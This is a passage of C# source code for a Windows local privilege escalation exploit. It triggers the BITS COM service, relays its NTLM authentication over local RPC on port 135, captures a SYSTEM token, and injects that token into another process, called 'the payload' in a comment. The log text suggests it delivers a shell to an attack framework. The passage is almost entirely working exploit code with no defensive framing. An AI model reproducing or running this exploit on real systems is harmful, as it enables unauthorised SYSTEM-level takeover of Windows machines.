	public void SetElementTimes (string pwcsName, ImmFILETIME[] pctime, ImmFILETIME[] patime, ImmFILETIME[] pmtime){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void SetStateBits (uint grfStateBits, uint grfMask){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void Stat (ImmSTATSTG[] pstatstg, uint grfStatFlag){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.Stat(pstatstg, grfStatFlag);
	    pstatstg[0].pwcsName = "hello.stg";
	    Console.WriteLine("end >> " + GetCurrentMethod());
	}

	public static IntPtr NativeGuid(string arg_guid){
	    Guid guid = new Guid(arg_guid);
	    IntPtr p_guid = Marshal.AllocCoTaskMem(16);
	    Marshal.Copy(guid.ToByteArray(), 0, p_guid, 16);
	    return p_guid;
	}
    }
    
    class DataPacket {
	public byte[] data;
	public TcpClient client;
	
	public DataPacket(byte[] arg_data){
	    data = arg_data;
	}
    }

    class QueueInfo {
	public BlockingCollection<DataPacket> server_queue;
	public BlockingCollection<DataPacket> client_queue;
    }
    
    public class Program{
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TOKEN_PRIVILEGES
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        // Add references to APIS
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(uint access, bool inheritHandle, int procId);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetProcAddress(IntPtr h, string name);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
           uint dwDesiredAccess, bool bInheritHandle, uint dwOptions);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern bool DuplicateToken(ref IntPtr htok, uint a, out IntPtr x);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, int lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetLastError();
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr htok);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TOKEN_PRIVILEGES newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
	
        const int SE_PRIVILEGE_ENABLED = 0x00000002;
        const int SE_PRIVILEGE_DISABLED = 0x00000000;
        const int TOKEN_QUERY = 0x00000008;
        const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

	public static void enable_impersonation_privs(IntPtr process_handle){
	    IntPtr token_handle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
	    TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES();
	    bool return_value;
	    
	    privileges.Count = 1;
	    privileges.Luid = 0;
	    privileges.Attr = 2;
	    
	    OpenProcessToken(process_handle,
			     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
			     ref token_handle
			     );
	    LookupPrivilegeValue(null, "SeImpersonatePrivilege", ref privileges.Luid);

	    Console.WriteLine("[enable_impersonation_privs] Got LUID {0:x8}", privileges.Luid);
	    
	    return_value = AdjustTokenPrivileges(token_handle, false, ref privileges, 0, IntPtr.Zero, IntPtr.Zero);

	    if (return_value)
		Console.WriteLine("[enable_impersonation_privs] adjusted token privileges");
	    else
		Console.WriteLine("[enable_impersonation_privs] FAILED to adjust token privileges");
	}

	public struct PROCESS_INFORMATION{
	    public IntPtr hProcess;
	    public IntPtr hThread;
	    public uint dwProcessId;
	    public uint dwThreadId;
	}

	public struct STARTUPINFO{
	    public uint cb;
	    public string lpReserved;
	    public string lpDesktop;
	    public string lpTitle;
	    public uint dwX;
	    public uint dwY;
	    public uint dwXSize;
	    public uint dwYSize;
	    public uint dwXCountChars;
	    public uint dwYCountChars;
	    public uint dwFillAttribute;
	    public uint dwFlags;
	    public short wShowWindow;
	    public short cbReserved2;
	    public IntPtr lpReserved2;
	    public IntPtr hStdInput;
	    public IntPtr hStdOutput;
	    public IntPtr hStdError;
	}

	public struct SECURITY_ATTRIBUTES{
	    public int length;
	    public IntPtr lpSecurityDescriptor;
	    public bool bInheritHandle;
	}

	[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool CreateProcessWithTokenW(
							  IntPtr hToken, 
							  int dwLogonFlags, 
							  string lpApplicationName, 
							  string lpCommandLine, 
							  CreationFlags dwCreationFlags, 
							  IntPtr lpEnvironment, 
							  string lpCurrentDirectory, 
							  [In] ref STARTUPINFO lpStartupInfo, 
							  out PROCESS_INFORMATION lpProcessInformation);

	public enum LogonFlags{
	    WithProfile = 1,
	    NetCredentialsOnly
	};

	public enum CreationFlags{
	    DefaultErrorMode = 0x04000000,
	    NewConsole = 0x00000010,
	    NewProcessGroup = 0x00000200,
	    SeparateWOWVDM = 0x00000800,
	    Suspended = 0x00000004,
	    UnicodeEnvironment = 0x00000400,
	    ExtendedStartupInfoPresent = 0x00080000
	};
	
	// NN: https://stackoverflow.com/questions/1486999/how-to-zero-out-memory-allocated-by-marshal-allochglobal
	[DllImport("kernel32.dll")]
	static extern void RtlZeroMemory(IntPtr dst, int length);

	public static bool launch_successful = false;

	public static void launch_callback(IntPtr p_elevated_handle){
	    /*
	        This is the payload, so, here we'll duplicate the current TOKEN_SYSTEM in
	        the process the our node.
	    */
        if (! launch_successful){
            bool success;
            STARTUPINFO startup_info = new STARTUPINFO();
            PROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
            uint PROCESS_ALL_ACCESS = 0x001F0FFF;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            startup_info.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            IntPtr elevated_handle = Marshal.ReadIntPtr(p_elevated_handle);
            Console.WriteLine("[launch_callback] ImpersonateLoggedOnUser");

            /* First We elevate the current powershell Thread to SYSTEM */
            bool r = ImpersonateLoggedOnUser(elevated_handle); // Or SetThreadToken(0, p_elevated_handle);
            IntPtr myhandle = Process.GetCurrentProcess().Handle;
            /* Second We Open our node Process to duplicate the TOKEN_SYSTEM handle */
            IntPtr targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, PID_NODE);
            IntPtr ipHandle = IntPtr.Zero;
            /* Finally We Duplicate the SYSTEM_TOKEN handle into our node process */
            r = DuplicateHandle(myhandle, elevated_handle, targetHandle, out ipHandle, 0, false, DUPLICATE_SAME_ACCESS);
            /*
                Many APIs like CreateFile, FindFirstFile, etc will make use the current Thread token privileges, so the
                first action when our node have the SYSTEM_TOKEN is calling to SetThreadToken(0, handle_system_token).
                Now with this token the node process must call CreateProcessWithTokenW to create new process with
                SYSTEM privileges.
            */
            success = r;
            if (!success){
                Console.WriteLine("[launch_callback] failed to launch callback!");
            } else {
                Console.WriteLine("[launch_callback] successfully launched callback! Check Canvas for shell...");
                launch_successful = true;
            }
        }
    }
	



	
	[DllImport ("ole32.dll")]
	public extern static int CreateILockBytesOnHGlobal(IntPtr hGlobal, [MarshalAs(UnmanagedType.Bool)] bool fDeleteOnRelease, IntPtr ppLkbyt);
	[DllImport ("ole32.dll")]
	public extern static int StgCreateDocfileOnILockBytes(IntPtr plkbyt, StgmConstants grfMode, int reserved, out ImmIStorage ppstgOpen);

	[DllImport("Kernel32.dll", EntryPoint="RtlZeroMemory", SetLastError=false)]
	static extern void ZeroMemory(IntPtr dest, int size);



	public static bool new_connection = false;


	

	public static void RPCClient(Object arg_queue_info){
	    QueueInfo queue_info = (QueueInfo)arg_queue_info;
	    BlockingCollection<DataPacket> client_queue = queue_info.client_queue;
	    BlockingCollection<DataPacket> server_queue = queue_info.server_queue;
	    
	    TcpClient client = new TcpClient("127.0.0.1", 135);
	    NetworkStream stream = client.GetStream();
	    bool finished = false;
	    int count = 0;

	    while (!finished){
		DataPacket dp = (DataPacket)client_queue.Take();

		if (new_connection){
		    Console.WriteLine("[client] got reconnection message");
		    client = new TcpClient("127.0.0.1", 135);
		    stream = client.GetStream();
		    new_connection = false;
		}
		
		Console.WriteLine(String.Format("[client #{0}] Pulled packet of size:{1} from queue", count, dp.data.Length));


		byte[] response = new byte[4096];
		stream.Write(dp.data, 0, dp.data.Length);
		
		int recv_count = stream.Read(response, 0, response.Length);

		Console.WriteLine(String.Format("[client #{0}] read response of {1} bytes", count, recv_count));

		if (recv_count > 0){
		    byte[] resp_data = response.Take(recv_count).ToArray();
		    DataPacket resp_dp = new DataPacket(resp_data);


		    Console.WriteLine(String.Format("[client #{0}] signaling server to send {1} bytes", count, recv_count));
		    server_queue.Add(resp_dp);
		}
		
		count ++ ;
	    }
	}

	public static void RPCServer(Object arg_queue_info){
	    QueueInfo queue_info = (QueueInfo)arg_queue_info;
	    BlockingCollection<DataPacket> client_queue = queue_info.client_queue;
	    BlockingCollection<DataPacket> server_queue = queue_info.server_queue;
	    // NN: change the port requirement
	    TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"), SERVER_PORT);
	    byte[] buffer = new byte[4096];
	    bool finished = false;
	    listener.Start();

	    int count = 0;


	    Console.WriteLine("[server] waiting for client connection...");
	    TcpClient client = listener.AcceptTcpClient();
	    Console.WriteLine("[server] got client!");
	    
	    client.NoDelay = true;
	    NetworkStream stream = client.GetStream();

	    NTLMExecutor executor = new NTLMExecutor();

	    while (!finished){
		buffer = new byte[4096];
		BinaryReader reader = new BinaryReader(stream);

		Console.WriteLine("[server] reading next bytes...!");

		int read_length = stream.Read(buffer, 0, buffer.Length);


		Console.WriteLine(String.Format("[server #{0}] read {1} bytes from socket", count, read_length));

		if (read_length > 0){
		    buffer = buffer.Take(read_length).ToArray();
		    
		    executor.dispatch_ntlm(buffer);
		    
		    if (executor.check_cred_handle()){
			enable_impersonation_privs(Process.GetCurrentProcess().Handle);
			launch_callback(executor.p_elevated_handle);
		    }

		    if (launch_successful){
			finished = true;
			break;
		    }

		    DataPacket recv_dp = new DataPacket(buffer);
		    
		    client_queue.Add(recv_dp);

		    Console.WriteLine(String.Format("[server #{0}] asking for next packet from client...", count));
		    
		    DataPacket send_packet = (DataPacket)server_queue.Take();

		    Console.WriteLine(String.Format("[server #{0}] relaying {1} bytes of data from client thread", count, send_packet.data.Length));

		    // file_stream = new FileStream(String.Format("C:\\Users\\baremetal\\Desktop\\iddqd\\next\\server_send_{0}.bin", count), FileMode.Create);
		    // file_writer = new BinaryWriter(file_stream);
		    // file_writer.Write(send_packet.data);
		    // file_writer.Close();
		    // file_stream.Close();

		    executor.dispatch_ntlm(send_packet.data);

		    if (executor.check_cred_handle()){
			enable_impersonation_privs(Process.GetCurrentProcess().Handle);
			launch_callback(executor.p_elevated_handle);
		    }
		    
		    if (launch_successful){
			finished = true;
			break;
		    }


		    stream.Write(send_packet.data, 0, send_packet.data.Length);

		    Thread.Sleep(1000);
		    
		    if (listener.Pending()){
			Console.WriteLine("[server] got reconnection");
			client = listener.AcceptTcpClient();
			stream = client.GetStream();
			new_connection = true;
		    }

		    count ++;
		}
	    }
	}


	public static void Main(){
	    IntPtr p_lb = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
	    ZeroMemory(p_lb, Marshal.SizeOf(typeof(IntPtr)));
	    ImmIStorage storage = null;
	    var iret = CreateILockBytesOnHGlobal(IntPtr.Zero, false, p_lb);

	    Console.WriteLine("CreateILockBytesOnHGlobal return value: " + iret);

	    IntPtr lb = Marshal.ReadIntPtr(p_lb);

	    Console.WriteLine(String.Format("Read of pointer to ILockBytes object succeeded: {0:x8}", lb.ToInt64()));
	    
	    StgCreateDocfileOnILockBytes(lb, StgmConstants.CREATE | StgmConstants.READWRITE | StgmConstants.SHARE_EXCLUSIVE, 0, out storage);

	    Console.WriteLine("StgCreateDocfileOnILockBytes suceeded");
	    ImmComStorage ics = new ImmComStorage(storage);


	    Guid bits_clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");

	    Guid iunknown_clsid = new Guid("00000000-0000-0000-C000-000000000046");
            	    
	    ImmComStorage.MULTI_QI[] interfaces = new ImmComStorage.MULTI_QI[1];
	    
	    
	    interfaces[0].pIID = ImmComStorage.NativeGuid("00000000-0000-0000-C000-000000000046");
	    interfaces[0].pItf = null;
	    interfaces[0].hr = 0;

	    // COSERVERINFO server_info = null;

	    BlockingCollection<DataPacket> server_queue = new BlockingCollection<DataPacket>(500);
	    BlockingCollection<DataPacket> client_queue = new BlockingCollection<DataPacket>(500);

	    QueueInfo queue_info = new QueueInfo();
	    queue_info.client_queue = client_queue;
	    queue_info.server_queue = server_queue;

	    
	    
	    Thread server_thread = new Thread(new ParameterizedThreadStart(RPCServer));
	    server_thread.Start(queue_info);
	    Thread client_thread = new Thread(new ParameterizedThreadStart(RPCClient));
	    client_thread.Start(queue_info);

	    TriggerCOM trigger = new TriggerCOM(bits_clsid, ics, interfaces);

	    Thread trigger_thread = new Thread(trigger.StartCOM);

	    trigger_thread.Start();

            server_thread.Join();
	    
	    
	}

	class TriggerCOM{
	    private Guid clsid;
	    private ImmComStorage ics;
	    private ImmComStorage.MULTI_QI[] interfaces;
	    public TriggerCOM( Guid arg_clsid, ImmComStorage arg_ics, ImmComStorage.MULTI_QI[] arg_interfaces){
		clsid = arg_clsid;
		ics = arg_ics;
		interfaces = arg_interfaces;
	    }

	    public void StartCOM(){
		try { 
		    ImmComStorage.CoGetInstanceFromIStorage(IntPtr.Zero,
							    ref clsid,
							    null,
							    CLSCTX.CLSCTX_LOCAL_SERVER,
							    ics, 1, interfaces);
		} catch (COMException com_exception){
		    Console.WriteLine("Exiting");
		}

	    }
	}
    }
